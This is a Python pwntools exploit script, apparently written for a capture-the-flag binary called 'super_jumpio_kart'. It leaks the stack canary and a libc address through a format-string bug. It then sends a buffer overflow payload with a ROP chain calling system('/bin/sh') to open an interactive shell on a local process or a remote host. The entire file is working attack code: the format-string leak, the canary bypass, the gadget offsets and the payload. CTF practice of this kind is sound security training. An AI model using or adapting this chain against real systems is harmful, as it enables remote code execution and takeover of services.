#!/usr/bin/env python3

from pwn import *
import sys
context.log_level = "debug"
context.arch = "amd64"

if len(sys.argv) == 1:
    r = process("./super_jumpio_kart")
    if args.GDB:
        gdb.attach(r,'brva 0x188f')
elif len(sys.argv) == 3:
    r = remote(sys.argv[1], sys.argv[2])
else:
    print("Usage: python3 {} [GDB | REMOTE_IP PORT]".format(sys.argv[0]))
    sys.exit(1)

s       = lambda data               :r.send(data)
sa      = lambda x, y               :r.sendafter(x, y)
sl      = lambda data               :r.sendline(data)
sla     = lambda x, y               :r.sendlineafter(x, y)
ru      = lambda delims, drop=True  :r.recvuntil(delims, drop)
leak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))


sla(">","4")
sla(":","%9$p.%12$p.")
ru("with: ")
canary = int(ru("."), 16)
# Chuyển biến libc thành một tên khác để không bị ghi đè
libc_base = int(ru("."), 16) - 0x203b20
leak("libc",hex(libc_base))
leak("canary",hex(canary))

# Tính toán các địa chỉ từ libc_base
pop_rdi = libc_base + 0x10f75b
system = libc_base + 0x58740
bin_sh = libc_base + 0x1cb42f

ru("crashing!")

for i in range(7):
    line = ru(b"ahead: ")
    if b'LEFT' in line:
        sl(b'L')
        log.info(f"Turn {i+1}: Saw LEFT, Sent 'L'")
    elif b'RIGHT' in line:
        sl(b'R')
        log.info(f"Turn {i+1}: Saw RIGHT, Sent 'R'")
    ru(b"Nice!")

sla("Up?? (y/n)", "y")
# Sửa lại payload một chút để cho an toàn
payload = cyclic(72) + p64(canary) + p64(0xdeadbeef) * 3 + p64(pop_rdi+1) + p64(pop_rdi) + p64(bin_sh) + p64(system)
sla("your victory:", payload)
r.interactive()